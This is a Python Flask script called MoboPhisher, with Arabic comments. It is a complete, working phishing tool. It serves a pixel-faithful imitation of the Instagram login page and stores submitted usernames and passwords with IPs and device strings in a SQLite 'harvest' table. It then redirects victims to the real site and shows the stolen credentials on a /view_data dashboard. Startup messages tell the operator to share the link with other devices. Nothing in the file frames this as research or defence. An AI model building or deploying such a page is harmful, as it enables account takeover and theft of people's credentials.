#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# نسخة محسنة: تعمل على جميع الهواتف + تصميم Instagram الحقيقي

import os
import sys
import sqlite3
import socket
import threading
import requests
from flask import Flask, request, redirect, render_template_string
from uuid import uuid4
from datetime import datetime
from threading import Thread

app = Flask(__name__)
DB_NAME = "mobo_captures.db"

class MoboPhisher:
    def __init__(self):
        self.app = app
        self.setup_routes()
        self.cred_count = 0
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
        })
        self.init_db()
        self.base_url = self.get_base_url()

    def get_base_url(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return f"http://{ip}:8080"
        except:
            return "http://mobo33:8080"

    def init_db(self):
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS harvest (
            id TEXT PRIMARY KEY,
            username TEXT,
            password TEXT,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.commit()
        conn.close()

    def spoof_login_page(self):
        # تصميم مستوحى من صفحة تسجيل الدخول الحقيقية لإنستغرام (الوضع النهاري)
        return """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        :root {
            --ig-primary-background: #FFFFFF;
            --ig-secondary-background: #FAFAFA;
            --ig-primary-text: #262626;
            --ig-secondary-text: #8E8E8E;
            --ig-elevated-background: #FFFFFF;
            --ig-elevated-separator: #DBDBDB;
            --ig-link: #00376B;
            --ig-blue: #0095F6;
            --ig-button-text: #FFFFFF;
            --ig-font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: var(--ig-secondary-background);
            font-family: var(--ig-font-family);
            color: var(--ig-primary-text);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-container {
            background: var(--ig-primary-background);
            border: 1px solid var(--ig-elevated-separator);
            border-radius: 1px;
            width: 100%;
            max-width: 350px;
            padding: 40px 40px 20px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            font-family: 'Billabong', 'Instagram Sans Script', cursive;
            font-size: 50px;
            margin-bottom: 30px;
            color: var(--ig-primary-text);
        }
        .input-group {
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            padding: 9px 8px 7px;
            background: var(--ig-secondary-background);
            border: 1px solid var(--ig-elevated-separator);
            border-radius: 3px;
            font-size: 14px;
            color: var(--ig-primary-text);
        }
        input:focus {
            outline: none;
            border-color: var(--ig-secondary-text);
        }
        button {
            width: 100%;
            background-color: var(--ig-blue);
            color: var(--ig-button-text);
            border: none;
            border-radius: 4px;
            padding: 8px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 12px;
            cursor: pointer;
        }
        button:disabled {
            opacity: 0.7;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: var(--ig-elevated-separator);
        }
        .divider-text {
            margin: 0 18px;
            color: var(--ig-secondary-text);
            font-size: 13px;
            font-weight: 600;
        }
        .forgot-password {
            color: var(--ig-link);
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }
        .signup-box {
            background: var(--ig-primary-background);
            border: 1px solid var(--ig-elevated-separator);
            border-radius: 1px;
            width: 100%;
            max-width: 350px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-box a {
            color: var(--ig-blue);
            text-decoration: none;
            font-weight: 600;
        }
        .get-app {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        .get-app p {
            margin-bottom: 15px;
        }
        .app-badges img {
            height: 40px;
            margin: 0 5px;
        }
        @media (max-width: 450px) {
            .login-container {
                border: none;
                background: transparent;
                padding: 20px 0;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">Instagram</div>
        <form method="POST" action="/submit">
            <div class="input-group">
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>
    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>
    <div class="get-app">
        <p>Get the app.</p>
        <div class="app-badges">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yR/r/2JX0kY8s5J8.png" alt="App Store">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yQ/r/5JX0kY8s5J8.png" alt="Google Play">
        </div>
    </div>
</body>
</html>"""

    def setup_routes(self):
        @app.route('/')
        def home():
            return self.spoof_login_page()
        
        @app.route('/submit', methods=['POST'])
        def submit():
            username = request.form.get('username')
            password = request.form.get('password')
            ip = request.remote_addr
            user_agent = request.headers.get('User-Agent')
            
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO harvest (id, username, password, ip, user_agent) VALUES (?,?,?,?,?)",
                      (str(uuid4()), username, password, ip, user_agent))
            conn.commit()
            conn.close()
            return redirect("https://instagram.com", code=302)
        
        @app.route('/view_data')
        def view_data():
            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("SELECT * FROM harvest ORDER BY timestamp DESC")
            data = c.fetchall()
            conn.close()
            
            html = """<!DOCTYPE html>
<html>
<head>
    <title>@mobo33.3 Harvested Data</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background: #121212; 
            color: #e0e0e0; 
            font-family: Arial, sans-serif; 
            padding: 20px; 
            overflow-x: auto;
        }
        h1 {
            text-align: center;
            background: linear-gradient(45deg, #833ab4, #fd1d1d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 30px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            background: #1e1e1e; 
            font-size: 14px;
        }
        th, td { 
            padding: 12px 15px; 
            border: 1px solid #333; 
            text-align: left; 
            word-break: break-all;
        }
        th { 
            background: #262626; 
            color: #fd1d1d; 
        }
        tr:nth-child(even) { 
            background: #1a1a1a; 
        }
        .back-btn {
            display: block; 
            width: 200px; 
            margin: 30px auto; 
            padding: 10px;
            background: linear-gradient(45deg, #833ab4, #fd1d1d); 
            color: white;
            text-align: center; 
            text-decoration: none;
            border-radius: 5px; 
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>@mobo33.3 Harvested Credentials</h1>
    <table>
        <tr>
            <th>ID</th>
            <th>Username</th>
            <th>Password</th>
            <th>IP</th>
            <th>Device</th>
            <th>Timestamp</th>
        </tr>"""
            
            for row in data:
                html += f"""
        <tr>
            <td>{row[0][:8]}...</td>
            <td>{row[1]}</td>
            <td><strong style="color:#00ff00">{row[2]}</strong></td>
            <td>{row[3]}</td>
            <td>{row[4][:50]}</td>
            <td>{row[5]}</td>
        </tr>"""
            
            html += """
    </table>
    <a href="/" class="back-btn">Back to Verification</a>
</body>
</html>"""
            return html

    def launch(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
            print("\n" + "="*50)
            print(f"[+] Server running at: http://{ip_address}:8080")
            print(f"[+] Alternative URL: http://mobo33:8080")
            print("="*50)
            print(f"[+] Login page: http://{ip_address}:8080")
            print(f"[+] Credentials view: http://{ip_address}:8080/view_data")
            print("\n[!] Share this URL with other devices on the same network")
        except Exception as e:
            print(f"\n[!] Network error: {e}")
            print("[!] Using fallback URL: http://mobo33:8080")
            ip_address = "mobo33"
        
        def run_server():
            app.run(host='0.0.0.0', port=8080, threaded=True)
        
        server_thread = Thread(target=run_server)
        server_thread.daemon = True
        server_thread.start()
        
        try:
            input("\n[!] Press Enter to stop server...\n")
        except:
            pass
        print("\n[!] Server stopped")

if __name__ == "__main__":
    phisher = MoboPhisher()
    phisher.launch()